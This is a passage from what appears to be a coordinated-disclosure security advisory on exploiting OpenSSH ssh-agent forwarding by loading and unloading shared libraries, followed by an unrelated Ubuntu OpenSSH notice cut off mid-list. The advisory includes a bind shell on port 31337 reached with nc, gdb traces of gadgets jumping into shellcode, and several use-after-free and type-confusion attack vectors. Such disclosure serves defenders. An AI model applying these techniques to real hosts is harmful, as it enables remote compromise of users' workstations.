Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice        912  0.0  0.0   6060  2312 ?        Ss   17:18   0:00 ssh-agent -s
alice        928  0.0  0.0   2872   956 ?        S    17:25   0:00  \_ [sh]
alice        953  0.0  0.0   7060  3068 ?        R    17:40   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225
...
(gdb) continue
Continuing.

Program received signal SIGBUS, Bus error.
memset () at ../sysdeps/x86_64/multiarch/memset-vec-unaligned-erms.S:186

(gdb) stepi
0x00007f2ba9d7c350 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) x/10i 0x00007f2ba9d7c350
=> 0x7f2ba9d7c350:      add    $0x28,%rsp
   0x7f2ba9d7c354:      mov    %r12,%rax
   0x7f2ba9d7c357:      pop    %rbx
   0x7f2ba9d7c358:      pop    %rbp
   0x7f2ba9d7c359:      pop    %r12
   0x7f2ba9d7c35b:      pop    %r13
   0x7f2ba9d7c35d:      pop    %r14
   0x7f2ba9d7c35f:      pop    %r15
   0x7f2ba9d7c361:      ret
   ...

(gdb) stepi
...
0x00007f2ba9d7c361 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) stepi
0x00007fff7aae5e90 in ?? ()

(gdb) x/10i 0x00007fff7aae5e90
=> 0x7fff7aae5e90:      add    %dl,(%rax)
   0x7fff7aae5e92:      and    %eax,(%rax)
   0x7fff7aae5e94:      add    %al,(%rax)
   0x7fff7aae5e96:      add    %al,(%rax)
   0x7fff7aae5e98:      add    %ah,(%rax)
   0x7fff7aae5e9a:      and    %eax,(%rax)
   0x7fff7aae5e9c:      add    %al,(%rax)
   0x7fff7aae5e9e:      add    %al,(%rax)
   0x7fff7aae5ea0:      call   0x7fff7aae7fbe
   ...

(gdb) stepi
...
0x00007fff7aae5ea0 in ?? ()

(gdb) stepi
0x00007fff7aae7fbe in ?? ()

(gdb) x/10i 0x00007fff7aae7fbe
=> 0x7fff7aae7fbe:      nop
   0x7fff7aae7fbf:      nop
   0x7fff7aae7fc0:      nop
   0x7fff7aae7fc1:      nop
   0x7fff7aae7fc2:      nop
   0x7fff7aae7fc3:      nop
   0x7fff7aae7fc4:      nop
   0x7fff7aae7fc5:      nop
   0x7fff7aae7fc6:      nop
   0x7fff7aae7fc7:      nop

(gdb) !grep stack /proc/1225/maps
7fff7aacb000-7fff7aaeb000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628979
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fff5000d9d0 in ?? ()

(gdb) !grep stack /proc/3628979/maps
7fff4fff3000-7fff50014000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
66254      0x00007f9ae7d82df4:  call   0x7f9ae7d70180 <gcry_mpi_new@plt>
66255      0x00007f9ae7d70180 <gcry_mpi_new@...+0>:     endbr64
66256      0x00007f9ae7d70184 <gcry_mpi_new@...+4>:     bnd jmp *0x7aa9d(%rip)        # 0x7f9ae7deac28 <gcry_mpi_new@....plt>
66257      0x00007f9af801bbe0 <gcry_mpi_new+0>: endbr64
66258      0x00007f9af801bbe4 <gcry_mpi_new+4>: push   %r12
66259      0x00007f9af801bbe6 <gcry_mpi_new+6>: push   %rbx
66260      0x00007f9af801bbe7 <gcry_mpi_new+7>: lea    0x3f(%rdi),%ebx
66261      0x00007f9af801bbea <gcry_mpi_new+10>:        mov    $0x18,%edi
66262      0x00007f9af801bbef <gcry_mpi_new+15>:        shr    $0x6,%ebx
66263      0x00007f9af801bbf2 <gcry_mpi_new+18>:        sub    $0x8,%rsp
66264      0x00007f9af801bbf6 <gcry_mpi_new+22>:        call   0x7f9af801bb40
66265      0x00007f9af801bb40:  endbr64
...
66285      0x00007f9af809cc60:  mov    0xa8311(%rip),%rax        # 0x7f9af8144f78
66286      0x00007f9af809cc67:  test   %rax,%rax
66287      0x00007f9af809cc6a:  jne    0x7f9af809cc44
66288      0x00007f9af809cc44:  call   *%rax

66289      0x00007f9afc27edc0:  cmp    %eax,%ebx
66290      0x00007f9afc27edc2:  jne    0x7f9afc27f150
66291      0x00007f9afc27f150:  mov    %r14,%rsi
66292      0x00007f9afc27f153:  mov    %r13,%rdi
66293      0x00007f9afc27f156:  call   *%rbx

------------------------------------------------------------------------

In the following example, the unmapped callback function is called at
line 87352, the replacement code (gadget) is executed instead at line
87353, and jumps to the stack at line 87354:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628993
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffe4fc16d10 in ?? ()

(gdb) !grep stack /proc/3628993/maps
7ffe4fbfc000-7ffe4fc1d000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
87347      0x00007f35f8972d26 <_ZN7QObjectC2ER14QObjectPrivatePS_+182>: lea    0x26acd3(%rip),%rax        # 0x7f35f8bdda00 <qtHookData>
87348      0x00007f35f8972d2d <_ZN7QObjectC2ER14QObjectPrivatePS_+189>: mov    0x18(%rax),%rax
87349      0x00007f35f8972d31 <_ZN7QObjectC2ER14QObjectPrivatePS_+193>: test   %rax,%rax
87350      0x00007f35f8972d34 <_ZN7QObjectC2ER14QObjectPrivatePS_+196>: jne    0x7f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>
87351      0x00007f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>: mov    %rbx,%rdi
87352      0x00007f35f8972d8b <_ZN7QObjectC2ER14QObjectPrivatePS_+283>: call   *%rax

87353      0x00007f35fa445130 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+80>:     pop    %rbp
87354      0x00007f35fa445131 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+81>:     ret

------------------------------------------------------------------------

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3629085
...
(gdb) record btrace
(gdb) continue
Continuing.

Thread 1 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
0x00007fffb2735c48 in ?? ()

(gdb) !grep stack /proc/3629085/maps
7fffb2716000-7fffb2737000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
79114      0x00007f8328147e3a:  call   0x7f8328135500 <gcry_mpi_scan@plt>
79115      0x00007f8328135500 <gcry_mpi_scan@...+0>:    endbr64
79116      0x00007f8328135504 <gcry_mpi_scan@...+4>:    bnd jmp *0x7a8dd(%rip)        # 0x7f83281afde8 <gcry_mpi_scan@....plt>
79117      0x00007f832e2b1220 <gcry_mpi_scan+0>:        endbr64
79118      0x00007f832e2b1224 <gcry_mpi_scan+4>:        sub    $0x8,%rsp
79119      0x00007f832e2b1228 <gcry_mpi_scan+8>:        call   0x7f832e32fbb0
79120      0x00007f832e32fbb0:  endbr64
...
79140      0x00007f832e2b436e:  mov    0x129dc3(%rip),%rax        # 0x7f832e3de138
79141      0x00007f832e2b4375:  test   %rax,%rax
79142      0x00007f832e2b4378:  je     0x7f832e2b43b0
79143      0x00007f832e2b437a:  jmp    *%rax

79144      0x00007f832ed274f0:  and    $0x20,%al
79145      0x00007f832ed274f2:  mov    %rax,0x50(%rsp)
79146      0x00007f832ed274f7:  mov    0x30(%rsp),%r13d
79147      0x00007f832ed274fc:  mov    0x58(%rsp),%r15
79148      0x00007f832ed27501:  mov    %ebx,%ebp
79149      0x00007f832ed27503:  mov    %r8d,%edx
79150      0x00007f832ed27506:  mov    0x50(%rsp),%rsi
79151      0x00007f832ed2750b:  mov    0x28(%rsp),%r14
79152      0x00007f832ed27510:  movslq 0x38(%r12),%rax
79153      0x00007f832ed27515:  sub    $0x8000,%ebp
79154      0x00007f832ed2751b:  mov    0x54(%r12),%ecx
79155      0x00007f832ed27520:  add    %rax,%r14
79156      0x00007f832ed27523:  mov    %r14,%rdi
79157      0x00007f832ed27526:  call   *%r15

========================================================================
Return from syscall use-after-free
========================================================================

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

------------------------------------------------------------------------
3631347 openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so", O_RDONLY|O_CLOEXEC) = 3
...
3631347 mmap(NULL, 33296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f5f3c3fb000
3631347 mmap(0x7f5f3c3fd000, 12288, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f5f3c3fd000
3631347 mmap(0x7f5f3c400000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f5f3c400000
3631347 mmap(0x7f5f3c402000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f5f3c402000
3631347 close(3)                        = 0
...
3631347 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7f5f3bd70910, parent_tid=0x7f5f3bd70910, exit_signal=0, stack=0x7f5f3b570000, stack_size=0x7fff00, tls=0x7f5f3bd70640} => {parent_tid=[3631372]}, 88) = 3631372
...
3631372 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=10, tv_nsec=0},  <unfinished ...>
------------------------------------------------------------------------

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------
3631347 socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 3
3631347 connect(3, {sa_family=AF_UNIX, sun_path="/dev/log"}, 110) = 0
3631347 sendto(3, "<35>Jun 22 18:35:25 ssh-pkcs11-helper[3631347]: error: dlsym(C_GetFunctionList) failed: /usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so: undefined symbol: C_GetFunctionList", 190, MSG_NOSIGNAL, NULL, 0) = 190
3631347 close(3)                        = 0
3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------
3631372 <... clock_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3631531
...
(gdb) record btrace
(gdb) continue
Continuing.
...
Thread 2 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f4603960640 (LWP 3631561)]
0x00007ffe2196f180 in ?? ()

(gdb) !grep stack /proc/3631531/maps
7ffe21955000-7ffe21976000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size unlimited
(gdb) record instruction-history
...
214        0x00007f4604b71866 <__GI___clock_nanosleep+198>:     syscall
...
240        0x00007f4604b71831 <__GI___clock_nanosleep+145>:     ret
...
244        0x00007f4604b766ef <__GI___nanosleep+31>:    ret
...
255        0x00007f4604b7663d <__sleep+93>:     ret

256        0x00007f46050fecff:  jmp    0x7f4604662e54 <__ieee754_j1f128+2276>
257        0x00007f4604662e54 <__ieee754_j1f128+2276>:  movq   0x60(%rsp),%mm3
...
1304       0x00007f460466285b <__ieee754_j1f128+747>:   add    $0xc8,%rsp
1305       0x00007f4604662862 <__ieee754_j1f128+754>:   ret

========================================================================
Sigaltstack use-after-free
========================================================================

>From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3633914
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fcd468671b1 in xtables_register_target () from /lib/x86_64-linux-gnu/libxtables.so.12

(gdb) x/i 0x00007fcd468671b1
=> 0x7fcd468671b1 <xtables_register_target+209>:        movzbl 0x18(%rax),%eax

(gdb) info registers
rax            0x0                 0
...

(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xcccccccccccccccc in ?? ()

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
134106     0x00007fcd4686719e <xtables_register_target+190>:    mov    0x6e1b(%rip),%rax        # 0x7fcd4686dfc0
134107     0x00007fcd468671a5 <xtables_register_target+197>:    movzwl 0x22(%rbx),%edx
134108     0x00007fcd468671a9 <xtables_register_target+201>:    mov    (%rax),%rax
134109     0x00007fcd468671ac <xtables_register_target+204>:    mov    %dx,0x6(%rsp)
134110  [disabled]
134111     0x00007fcd48e434a0:  ret    $0x1f0f
134112     0x00007fcd49655520 <__restore_rt+0>: mov    $0xf,%rax
134113     0x00007fcd49655527 <__restore_rt+7>: syscall

(gdb) info registers
rax            0x0                 0
rbx            0xcccccccccccccccc  -3689348814741910324
rcx            0xcccccccccccccccc  -3689348814741910324
rdx            0xcccccccccccccccc  -3689348814741910324
rsi            0xcccccccccccccccc  -3689348814741910324
rdi            0xcccccccccccccccc  -3689348814741910324
rbp            0xcccccccccccccccc  0xcccccccccccccccc
rsp            0xcccccccccccccccc  0xcccccccccccccccc
r8             0xcccccccccccccccc  -3689348814741910324
r9             0xcccccccccccccccc  -3689348814741910324
r10            0xcccccccccccccccc  -3689348814741910324
r11            0xcccccccccccccccc  -3689348814741910324
r12            0xcccccccccccccccc  -3689348814741910324
r13            0xcccccccccccccccc  -3689348814741910324
r14            0xcccccccccccccccc  -3689348814741910324
r15            0xcccccccccccccccc  -3689348814741910324
rip            0xcccccccccccccccc  0xcccccccccccccccc
------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3635541
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffcf5e9be10 in ?? ()

(gdb) !grep stack /proc/3635541/maps
7ffcf5e82000-7ffcf5ea3000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
57295      0x00007f7c8eaaccf1:  call   0x7f7c8ea99470 <_Unwind_GetCFA@plt>

57296      0x00007f7c8ea99470 <_Unwind_GetCFA@...+0>:   endbr64
57297      0x00007f7c8ea99474 <_Unwind_GetCFA@...+4>:   bnd jmp *0x1bc2d(%rip)        # 0x7f7c8eab50a8 <_Unwind_GetCFA@....plt>

57298      0x00007f7c8edce920 <_Unwind_GetCFA+0>:       sub    $0x18,%rsp
57299      0x00007f7c8edce924 <_Unwind_GetCFA+4>:       mov    %fs:0x28,%rax
57300      0x00007f7c8edce92d <_Unwind_GetCFA+13>:      mov    %rax,0x10(%rsp)
57301      0x00007f7c8edce932 <_Unwind_GetCFA+18>:      lea    0x8(%rsp),%rdx
57302      0x00007f7c8edce937 <_Unwind_GetCFA+23>:      mov    $0xfffffffe,%esi
57303      0x00007f7c8edce93c <_Unwind_GetCFA+28>:      call   0x7f7c8edca6b0 <unw_get_reg>

57304      0x00007f7c8edca6b0 <unw_get_reg+0>:  push   %rbp
57305      0x00007f7c8edca6b1 <unw_get_reg+1>:  push   %r14
57306      0x00007f7c8edca6b3 <unw_get_reg+3>:  push   %rbx
57307      0x00007f7c8edca6b4 <unw_get_reg+4>:  mov    %rdx,%r14
57308      0x00007f7c8edca6b7 <unw_get_reg+7>:  mov    %esi,%ebp
57309      0x00007f7c8edca6b9 <unw_get_reg+9>:  mov    %rdi,%rbx
57310      0x00007f7c8edca6bc <unw_get_reg+12>: mov    (%rdi),%rax
57311      0x00007f7c8edca6bf <unw_get_reg+15>: call   *0x10(%rax)

(gdb) !grep 7f7c8ea /proc/3635541/maps
7f7c8ea99000-7f7c8eab0000 r-xp 00003000 08:03 8788336                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1

(gdb) !grep 7f7c8ed /proc/3635541/maps
7f7c8edc9000-7f7c8edd1000 r-xp 00000000 08:03 11148811                   /usr/lib/llvm-14/lib/libunwind.so.1.0
------------------------------------------------------------------------

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>), but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

========================================================================
Acknowledgments
========================================================================

We thank the OpenSSH developers, and Damien Miller in particular, for
their outstanding work on this vulnerability and on OpenSSH in general.
We also thank Mitre's CVE Assignment Team for their quick response.
Finally, we dedicate this advisory to the Midnight Fox.

========================================================================
Timeline
========================================================================

2023-07-06: We sent a draft of our advisory and a preliminary patch to
the OpenSSH developers.

2023-07-07: The OpenSSH developers replied and sent us a more complete
set of patches.

2023-07-09: We sent feedback about these patches to the OpenSSH
developers.

2023-07-11: The OpenSSH developers sent us a complete set of patches,
and we sent them feedback about these patches.

2023-07-14: The OpenSSH developers informed us that "we're aiming to
make a security-only release ... on July 19th."

2023-07-19: Coordinated release.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from usn.ubuntu.com_8ad12e01_20250125_103004.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3538-1: OpenSSH vulnerabilities

22 January 2018

Several security issues were fixed in OpenSSH.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 17.10](/security/notices?release=artful)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [openssh](/security/cves?package=openssh) - secure shell (SSH) for secure access to remote machines

## Details

Jann Horn discovered that OpenSSH incorrectly loaded PKCS#11 modules from

untrusted directories. A remote attacker could possibly use this issue to

execute arbitrary PKCS#11 modules. This issue only affected Ubuntu 14.04

LTS and Ubuntu 16.04 LTS. ([CVE-2016-10009](/security/CVE-2016-10009))

Jann Horn discovered that OpenSSH incorrectly handled permissions on

Unix-domain sockets when privilege separation is disabled. A local attacker

could possibly use this issue to gain privileges. This issue only affected

Ubuntu 16.04 LTS. ([CVE-2016-10010](/security/CVE-2016-10010))

Jann Horn discovered that OpenSSH incorrectly handled certain buffer memory

operations. A local attacker could possibly use this issue to obtain

sensitive information. This issue only affected Ubuntu 14.04 LTS and Ubuntu

16.04 LTS. ([CVE-2016-10011](/security/CVE-2016-10011))

Guido Vranken discovered that OpenSSH incorrectly handled certain shared

memory manager operations. A local attacker could possibly use issue to

gain privileges. This issue only affected Ubuntu 14.04 LTS and Ubuntu 16.04

LTS. This issue only affected Ubuntu 14.04 LTS and Ubuntu 16.04 LTS.

([CVE-2016-10012](/security/CVE-2016-10012))

Michal Zalewski discovered that OpenSSH incorrectly prevented write

operations in readonly mode. A remote attacker could possibly use this

issue to create zero-length files, leading to a denial of service.

([CVE-2017-15906](/security/CVE-2017-15906))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 17.10

* [openssh-server](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:7.5p1-10ubuntu0.1](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A7.5p1-10ubuntu0.1)

##### Ubuntu 16.04

